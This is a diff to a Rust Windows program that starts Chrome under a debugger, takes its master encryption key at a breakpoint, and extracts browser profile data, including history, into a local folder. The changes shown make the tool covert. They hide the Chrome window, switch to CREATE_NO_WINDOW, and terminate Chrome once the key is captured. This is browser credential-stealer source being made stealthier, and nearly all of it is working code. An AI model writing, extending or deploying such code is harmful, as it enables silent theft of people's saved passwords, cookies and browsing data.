@@ -9,6 +9,7 @@ use windows_sys::Win32::System::ProcessStatus::*;
 use windows_sys::Win32::Storage::FileSystem::*;
 use windows_sys::Win32::Security::*;
 use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
+use windows_sys::Win32::UI::WindowsAndMessaging::*;
 use std::ptr::{null, null_mut};
 use std::mem::{size_of, zeroed};
 use std::path::{Path, PathBuf};
@@ -248,6 +249,7 @@ pub const CONTEXT_FULL: u32 = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMEN
 
 #[link(name = "kernel32")]
 extern "system" {
+    pub fn TerminateProcess(hprocess: HANDLE, uexitcode: u32) -> BOOL;
     pub fn CreateProcessW(
         lpapplicationname: *const u16,
         lpcommandline: *mut u16,
@@ -268,6 +270,9 @@ fn main() {
     unsafe {
         let mut si: STARTUPINFOW = zeroed();
         si.cb = size_of::<STARTUPINFOW>() as u32;
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE as u16;
+
         let mut pi: PROCESS_INFORMATION = zeroed();
 
         let mut chrome_cmd: Vec<u16> = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --no-first-run --no-default-browser-check\0"
@@ -280,7 +285,7 @@ fn main() {
             null(),
             null(),
             FALSE,
-            DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE,
+            DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW,
             null(),
             null(),
             &si,
@@ -344,6 +349,7 @@ unsafe fn debug_loop(h_process: HANDLE) {
                         println!("Target breakpoint hit!");
                         if extract_key(debug_event.dwThreadId, h_process) {
                             clear_hardware_breakpoints(debug_event.dwProcessId);
+                            terminate_chrome(h_process);
                         }
                     }
                     set_resume_flag(debug_event.dwThreadId);
@@ -688,6 +694,11 @@ fn extract_all_profiles_data(master_key: &[u8; 32]) {
         extract_history(&profile_path, &output_dir);
     }
     println!("Extraction complete. Data saved in chrome_extract folder.");
+}
+
+unsafe fn terminate_chrome(h_process: HANDLE) {
+    println!("Closing Chrome...");
+    TerminateProcess(h_process, 0);
 }
 
 unsafe fn extract_key(thread_id: u32, h_process: HANDLE) -> bool {
